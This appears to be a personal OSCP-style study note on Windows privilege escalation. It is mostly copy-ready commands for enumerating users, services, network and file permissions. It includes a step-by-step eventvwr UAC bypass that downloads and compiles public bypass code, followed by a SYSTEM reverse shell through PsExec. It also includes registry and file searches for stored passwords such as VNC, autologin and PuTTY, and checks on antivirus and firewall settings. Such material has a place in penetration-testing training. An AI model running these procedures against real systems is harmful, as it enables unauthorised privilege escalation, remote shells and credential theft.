Operators Handbook pg 356
OSCP Book pg 512

Any interesting user privileges? Note: The State column does not mean that the user does or does not have access to this privilege. If the privilege is listed, then that user has it.

#### Fuzzy's guide
```
https://www.fuzzysecurity.com/tutorials/16.html
```

#### User enumeration
```batch -target
echo %USERPROFILE%
```

```batch - windows
whoami
```

```batch - windows
whoami /priv
```

IF YOU ARE NT AUTHORITY BUT HAVE LIMITED PRIVS! [[Squid#Escalation]]

```batch - windows
whoami /groups
```

Use net user to check for Local Admin members! [[8._RunAs]]
```batch - windows
net user
```

```batch - windows
net user <user>
```

```batch - windows
net localgroup
```

```batch - windows
net localgroup administrators
```

```batch - windows
hostname
```

Look for internal ports open (MySQL):  [[Port 3306 - MySQL ~#Local login]]
#### Network enumeration
```batch - windows
ipconfig
```

```batch - windows
ipconfig /all
```

```batch - windows
arp -a
```

```batch - windows
route print
```

```batch - windows
netstat -ano
```

Notice that we see a lot of services running that we did not see in our initial scans! 

Now check out [[1._Cyber_Plumber_Lab]] to access these ports!

Is 3306 open? check:
```batch - windows
cd C:\xampp\mysql\bin
```

```batch - windows
mysql -u root -proot
```

#### System enumeration
```batch - target
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

Try just googling OS and build like : "Windows 7 Pro build 7601 exploit"

Hotfixes
```batch - target
wmic qfe
```

Kernel vulnerabilities OSCP Book pg 560
```batch - target
driverquery /v
```

```powershell - target
powershell -c get-psdrive
```

Find running services:
```batch - target
tasklist /SVC
```

With PowerShell:
```powershell - target
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

```batch - target
wmic service get name,displayname,pathname,startmode
```

Listing all installed applications:
```batch - target
wmic product get name,version,vendor
```

Look for old installation dates, may be more vulnerable:
```batch - target
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Look for services in unusual places, look for unquoted paths!:
[[16._Unquoted Path]]

#### icacls (F)ull or (M)odify permissions

![[0.__icalcs Table]]

```batch - target
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
```

```batch - target
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
```

```batch - target
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
```

```batch - target
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
```

```batch - target
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
```

```batch - target
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
```

```batch - target
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
```

```batch - target
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
```

PowerShell:
```powershell - target
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

```powershell - target
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
```

```powershell - target
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

#### Accesschk
[[12._ACCESSCHK]]

#### Bypass UAC eventvwr

https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/

Confirm UAC is on:
```batch - windows
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

```powershell - windows
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
```

Now notice the three highlighted keys above and their values.

1.  `EnableLUA` tells us whether UAC is enabled. If 0 we don’t need to bypass it at all can just PsExec to SYSTEM. If it’s 1 however, then check the other 2 keys.
2.  `ConsentPromptBehaviorAdmin` can theoretically take on [6 possible values](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4) (readable explanation [here](https://www.tenforums.com/tutorials/112621-change-uac-prompt-behavior-administrators-windows.html)), but from configuring the UAC slider in Windows settings it takes on either 0, 2 or 5.
3.  `PromptOnSecureDesktop` is binary, either 0 or 1.

==ConsentPromptBehaviorAdmin  : 5==
.....
==EnableLUA                   : 1==
.....
==PromptOnSecureDesktop       : 1==
.....

#### Method 1
Next, confirm the eventvwr.exe exists:
```batch - target
where /r C:\windows eventvwr.exe
```

```bash - kali
wget https://download.sysinternals.com/files/Strings.zip
```

Extract the Strings zip, upload to target.

```batch - target
strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate
```

`strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate`
`<autoElevate>true</autoElevate>`

```bash - kali
wget https://raw.githubusercontent.com/turbo/zero2hero/master/main.c
```

Uncomment block 66 - 69, changing "foobar.exe" to  your malicious reverse exe:

	GetCurrentDirectory(MAX_PATH, curPath);
	strcat(curPath, "\\reverse64.exe");

```bash - kali
x86_64-w64-mingw32-gcc main.c -o bypass64.exe
```

Set up listener, transfer to target, run bypass64.exe file.

```batch - taret
bypass64.exe
```

**When you run whoami, you will still be the same user, however,  when you run whoami /priv, you have much more privileges! **

Download PsExec and transfer to target.  Set up listener:

[[1._rlwrap]]

Run following command for system shell.
	- MAY NEED TO USE FULL PATH TO EXPLOIT FILE!
```
PsExec64.exe -i -accepteula -d -s C:\Users\alice\AppData\Local\Temp\Tools\reverse64.exe
```

#### Method 2
```bash - kali
wget https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1
```

```batch - target
Import-Module .\Invoke-EventViewer.ps1
```

[[1._rlwrap]]

```batch - target
Invoke-EventViewer %TEMP%\Tools\reverse64.exe
```

**When you run whoami, you will still be the same user, however,  when you run whoami /priv, you have much more privileges! **

Download PsExec and transfer to target.  Set up listener:

[[1._rlwrap]]

Run following command for system shell.
	- MAY NEED TO USE FULL PATH TO EXPLOIT FILE!
```batch - target
PsExec64.exe -i -accepteula -d -s %TEMP%\Tools\reverse64.exe
```


---

#### Harddrirves

```batch - windows
mountvol
```

```batch - windows
wmic logicaldisk get caption
```

```batch - windows
wmic logicaldisk get caption,description,providername
```

#### Password hunting

IF YOU KNOW ANOTHER USER'S USERNAME, SWAP PASSWORD FOR THE USERNAME!!!

```batch - windows
findstr /si password *.txt *.ini *.xml *.config
```

```batch - windows
dir /s *pass* == *cred* == *vnc* == *.config*
```

```batch - windows
findstr /spin "password" *.*
```

```powershell - windows
Get-ChildItem -Path .\ -Filter *.ps1 -Recurse -File -Name| ForEach-Object {[System.IO.Path]::GetFileNameWithoutExtension($_)}
```

```powershell - windows
Select-String -Path .\*.csv -Pattern "pass"
```

#### VNC password
```batch - windows
reg query "HKCU\Software\ORL\WinVNC3\Password"
```

#### Windows autologin
```batch - windows
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

#### SNMP Paramters
```batch - windows
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

#### Putty
```batch - windows
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

#### Search for password in registry

Try appending 
```batch - windows
| findstr REG_SZ
```

```batch - windows
reg query HKLM /f password /t REG_SZ /s
```

```batch - windows
reg query HKCU /f password /t REG_SZ /s
```

```batch - windows
reg query HKLM /f pass /t REG_SZ /s
```

```batch - windows
reg query HKCU /f pass /t REG_SZ /s
```

```batch - windows
reg query HKLM /f CurrentPass /t REG_SZ /s
```

```batch - windows
reg query HKCU /f CurrentPass /t REG_SZ /s
```

#### Firewall and AntiVirus
```batch - windows
sc query windefend
```

```batch - windows
sc queryex type=service
```

[[5._firewall and AntiVirus]]

Look for services that may lead to Anti-Virus names, or known vulnerable software.

```batch - windows
netsh advfirewall firewall dump
```

```batch - windows
netsh firewall show state
```

```batch - windows
netsh firewall show config
```

